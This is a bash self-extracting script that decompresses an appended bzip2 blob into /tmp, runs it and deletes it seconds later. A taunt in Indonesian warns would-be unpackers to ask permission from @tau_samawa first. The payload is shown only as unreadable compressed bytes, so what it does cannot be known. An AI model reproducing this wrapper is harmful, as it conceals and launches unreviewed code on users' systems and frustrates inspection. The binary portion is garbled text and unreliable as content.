#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYZ��  V�A�@ ���������   @T��ШJ�*2=Mi�!��z�L�di�j�IOS�4i�4h�hڀ�ɦ 8ɓC�� �� �M4i��I4�Ȟ��?D�F��z��SG���m =CЏP�`�bh]d�T��;� }X�@Bг&��?d�@�D���5�}qf�H�\j6^�Jz�u�
�� �NL�0J�������;h)�Z��~�
4�w�t3�\f�I��ѷ�zDMTd,�u�:v��1���	�^a�Â�R��#��Eu=�nٕE�iT�5��T����dV�^A� �`�%���E�琻��/�����R�D@$t�d������f.R��?D��&A)�w�$>Q����I��q�q����l�^;E��Z331�Y��JŨ��8a+�.j
��RHT��6r���q�<oE���L�qK����UH�T`Mt�b)1�7�����Q�BkUG>`l	�6r���p�3��O�	��� �a.��M����9�="���҅	���a�5�P2��`�E�*���\���U�	�cO`ĨU�p=F�'"3�WTc7&,�Qrvz�XƁ"����(QQ
Նj�'��!$��x�v��Vq�z'@,
�����]��BAj\